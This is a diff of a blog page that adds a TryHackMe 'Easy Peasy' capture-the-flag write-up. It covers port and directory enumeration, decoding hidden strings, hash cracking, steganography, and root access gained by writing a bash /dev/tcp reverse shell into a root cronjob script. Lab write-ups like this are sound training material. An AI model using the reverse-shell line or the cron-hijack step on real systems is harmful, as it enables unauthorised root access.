@@ -9,7 +9,11 @@
   <meta name="robots" content="all,follow">
   <meta name="googlebot" content="index,follow,snippet,archive">
   <meta property="og:title" content="TryHackMe - Easy Peasy" />
-<meta property="og:description" content="This is a writeup." />
+<meta property="og:description" content="Enumeration First we scan for open ports and services
+Nmap We use nmap with some default arguments.
+sudo nmap -sV -sC -oA nmap/first $IP It will return.
+PORT STATE SERVICE VERSION 80/tcp open http nginx 1.16.1 | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: nginx/1.16.1 |_http-title: Welcome to nginx! From the first scan we can see that port 80 is open with nginx version 1.16.1
+All ports So let&rsquo;s retry for all ports -p- in the background, using -v to increase the verbosity and removing the scripts -sC and version -sV parameters." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://joshuachp.github.io/writeups/tryhackme-easy-peasy/" />
 <meta property="article:published_time" content="2020-08-06T00:00:00+00:00" />
@@ -17,7 +21,11 @@
 
   <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="TryHackMe - Easy Peasy"/>
-<meta name="twitter:description" content="This is a writeup."/>
+<meta name="twitter:description" content="Enumeration First we scan for open ports and services
+Nmap We use nmap with some default arguments.
+sudo nmap -sV -sC -oA nmap/first $IP It will return.
+PORT STATE SERVICE VERSION 80/tcp open http nginx 1.16.1 | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: nginx/1.16.1 |_http-title: Welcome to nginx! From the first scan we can see that port 80 is open with nginx version 1.16.1
+All ports So let&rsquo;s retry for all ports -p- in the background, using -v to increase the verbosity and removing the scripts -sC and version -sV parameters."/>
 
   
   
@@ -75,8 +83,185 @@
 
   <div class="content" itemprop="articleBody">
   
-    <p>This is a writeup.</p>
+    <h2 id="enumeration">Enumeration</h2>
+<p>First we scan for open ports and services</p>
+<h3 id="nmap">Nmap</h3>
+<p>We use nmap with some default arguments.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -oA nmap/first $IP
+</code></pre></div><p>It will return.</p>
+<pre><code class="language-nmap" data-lang="nmap">PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.16.1
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: nginx/1.16.1
+|_http-title: Welcome to nginx!
+</code></pre><p>From the first scan we can see that port <code>80</code> is open with <strong>nginx</strong> version
+<code>1.16.1</code></p>
+<h4 id="all-ports">All ports</h4>
+<p>So let&rsquo;s retry for all ports <code>-p-</code> in the background, using <code>-v</code> to increase the
+verbosity and removing the scripts <code>-sC</code> and version <code>-sV</code> parameters.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -v -p- -oA nmap/all $IP
+</code></pre></div><p>This returns three ports open</p>
+<pre><code class="language-nmap" data-lang="nmap">PORT      STATE SERVICE
+80/tcp    open  http
+6498/tcp  open  unknown
+65524/tcp open  unknown
+</code></pre><p>Let&rsquo;s try to gather more information from those ports, scanning only those
+specifically.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV -oA nmap/ports -p 80,65524,6498 $IP
+</code></pre></div><p>The output is the following</p>
+<pre><code class="language-nmap" data-lang="nmap">PORT      STATE SERVICE VERSION
+80/tcp    open  http    nginx 1.16.1
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: nginx/1.16.1
+|_http-title: Welcome to nginx!
+6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
+|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
+|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
+65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: Apache/2.4.43 (Ubuntu)
+|_http-title: Apache2 Debian Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>So summing up we have:</p>
+<ol>
+<li>HTTP port 80 with nginx</li>
+<li>SSH port 6498 with OpenSSH</li>
+<li>HTTP port 65524 with Apache</li>
+</ol>
+<h3 id="gobuster">Gobuster</h3>
+<p>While scanning for other open ports let&rsquo;s start <strong>gobuster</strong> to enumerate
+directories on http port <code>80</code>. We will use the <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt">Seclist big</a> wordlist.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -o gobuster/nginx -w big.txt -u http://$IP/
+</code></pre></div><p>Gobuster finds an <code>hidden</code> directory.</p>
+<pre><code class="language-gobuster" data-lang="gobuster">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://$IP/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/08/10 13:50:37 Starting gobuster
+===============================================================
+/hidden (Status: 301)
+/robots.txt (Status: 200)
+===============================================================
+2020/08/10 13:54:18 Finished
+===============================================================
+</code></pre><p>Let&rsquo;s also scan the Apache server.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -o gobuster/apache -w big.txt -u http://$IP:65524/
+</code></pre></div><pre><code class="language-gobuster" data-lang="gobuster">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://$IP:65524/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/08/10 13:54:08 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2020/08/10 13:57:18 Finished
+===============================================================
+</code></pre><h2 id="compromising">Compromising</h2>
+<p>The second fase is a bit more confusing and the directions to find the flags
+aren&rsquo;t clear, but the access on the box is and privilege escalation is straight
+forward.</p>
+<h3 id="flag-1">Flag 1</h3>
+<p>Futher enumerating the <code>hidden</code> directory with gobuster we find another
+directory called <code>wathever</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -o gobuster/hidden -w big.txt -u http://$IP/hidden/
+</code></pre></div><pre><code class="language-gobuster" data-lang="gobuster">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://$IP/hidden/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/08/10 14:13:44 Starting gobuster
+===============================================================
+/whatever (Status: 301)
+===============================================================
+2020/08/10 14:16:48 Finished
+===============================================================
+</code></pre><p>Viewing the source code of the page there is an hidden <code>p</code> with a <strong>base64</strong>
+encoded string.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">hidden</span>&gt;Z____________________Q==&lt;/<span style="color:#f92672">p</span>&gt;
+</code></pre></div><p>Decoding it we can find the first flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo Z____________________Q<span style="color:#f92672">==</span> | base64 -d
 
+flag<span style="color:#f92672">{</span>f1rs7_fl4g<span style="color:#f92672">}</span>
+</code></pre></div><h3 id="flag-2">Flag 2</h3>
+<p>Using gobuster we have found <code>robots.txt</code> in the Apache server which shous us
+<strong>User-Agent</strong>.</p>
+<pre><code>User-Agent:*
+Disallow:/
+Robots Not Allowed
+User-Agent:a______________________________0
+Allow:/
+This Flag Can Enter But Only This Flag No More Exceptions
+</code></pre><p>The solution wasn&rsquo;t so good. You have to find the solution online in some
+obscure site searching for the hash :thinking:&hellip;</p>
+<pre><code>flag{______________}
+</code></pre><h3 id="flag-3">Flag 3</h3>
+<p>On the Apache home page we can find the third flag.</p>
+<pre><code>Fl4g 3 : flag{________________________________}
+</code></pre><h3 id="user-flag">User Flag</h3>
+<p>On the Apache main page in the source we can see an hidden <code>p</code> again.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">hidden</span>&gt;its encoded with ba....:O______________________u&lt;/<span style="color:#f92672">p</span>&gt;
+</code></pre></div><p>Since it is encoded with a base we open <a href="https://gchq.github.io/CyberChef/">Chyberchef</a> and try out a bunch of encodings.</p>
+<p>With <code>base62</code> we can find something that looks like an hidden directory.</p>
+<pre><code>/n0th1ng3ls3m4tt3r
+</code></pre><p>On this page we find a long string and an image.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">p</span>&gt;9______________________________________________________________1&lt;/<span style="color:#f92672">p</span>&gt;
+</code></pre></div><p>The hint tell us that it&rsquo;s GHOST, so we use <code>hashcat</code> and the wordlist that was
+provided to crack it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">6900</span> hash.txt easypeasy.txt
+</code></pre></div><p>With a bit of guessing we can use <code>steghide</code> on the image to extract some data.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
+</code></pre></div><p>The output are user and password information, the password is encoded in binary.</p>
+<pre><code>username:b____g
+password:
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+</code></pre><p>Using Cyberchef we can get the credentials.</p>
+<pre><code>username: b____g
+password: i__________________________y
+</code></pre><p>Those are the credentials for the SSH. So when you access you can find the user
+flag.</p>
+<pre><code>User Flag But It Seems Wrong Like It`s Rotated Or Something
+synt{a______________y}
+</code></pre><p>Which is a <code>rot13</code> of <code>flag{n______________l}</code>.</p>
+<h3 id="root-flag">Root Flag</h3>
+<p>Uploading <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">Linpeas</a>
+on the box we can find a cronjob that is run as root and execute a script
+<code>/var/www/.mysecretcronjob.sh</code>.</p>
+<pre><code class="language-crontab" data-lang="crontab">* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh
+</code></pre><p>We can put a reverse shell in the script to gain root access on the box.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/$USER_IP/9000 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><p>Open a listener and wait for the job to fire.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvnp <span style="color:#ae81ff">9000</span>
+</code></pre></div><p>The root flag is in a file <code>/root/.root.txt</code></p>
+<pre><code>flag{________________________________}
+</code></pre>
   
   </div>
 </article>
